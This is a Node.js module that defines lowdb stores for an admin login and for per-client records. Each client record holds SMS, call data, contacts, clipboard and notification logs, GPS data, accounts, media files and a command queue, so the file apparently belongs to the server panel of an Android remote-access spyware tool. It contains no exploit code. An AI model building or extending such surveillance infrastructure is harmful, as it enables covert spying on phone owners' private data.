const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
	fs = require('fs'),
	fse = require('fs-extra'),
    path = require('path'),
    adapter = new FileSync(path.join(__dirname, '../maindb.json')),

    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync(path.join(__dirname, '../clientData/') + clientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
			cameraList:[],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: [],
			actionLog: [],
			mediaFiles: [],
			info: [],
			dialogs: [],
			accounts: [],
			MFSettings: {
				width: 128,
				height: 128
			},
			
        }).write();
		
		//let fol = lowdb(new FileSync(path.join(__dirname, '../clientData/') + clientID + '/')).create();
		/*let pathFol = path.join(__dirname, '../clientData/') + clientID + '/';
		
		let pathFolOrig = path.join(__dirname, '../clientData/default/');
		
		if(!fs.existsSync(pathFol)){
			fs.mkdir(pathFol, { recursive: true }, (err) => {
				if (err) throw err;
			});
			//copy directory content including subfolders
			fse.copy(pathFolOrig, pathFol, function (err) {
			  if (err) {
				console.error(err);
			 } else {
				console.log("success!");
			 }
			}); 
		}*/
		
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};


